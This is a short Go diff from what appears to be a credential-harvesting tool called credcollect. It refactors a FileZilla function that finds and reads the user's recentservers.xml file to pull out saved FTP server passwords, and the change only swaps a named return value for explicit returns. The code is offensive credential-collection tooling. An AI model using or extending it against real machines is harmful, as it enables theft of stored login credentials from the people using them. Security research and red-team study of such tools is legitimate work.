@@ -11,19 +11,20 @@ import (
 	"github.com/404tk/credcollect/common/utils"
 )
 
-func FileZilla() (ret []common.FileZillaPassWord) {
+func FileZilla() []common.FileZillaPassWord {
+	ret := []common.FileZillaPassWord{}
 	filename, err := utils.GetItemPath(filepath.Join(os.Getenv("USERPROFILE"), "/AppData/Roaming/FileZilla/"), "recentservers.xml")
 	if err != nil {
-		return
+		return ret
 	}
 	file, err := os.Open(filename)
 	if err != nil {
-		return
+		return ret
 	}
 	defer file.Close()
 	data, err := ioutil.ReadAll(file)
 	if err != nil {
-		return
+		return ret
 	}
 
 	v := FileZillaXML{}
@@ -49,5 +50,5 @@ func FileZilla() (ret []common.FileZillaPassWord) {
 			}
 		}
 	}
-	return
+	return ret
 }
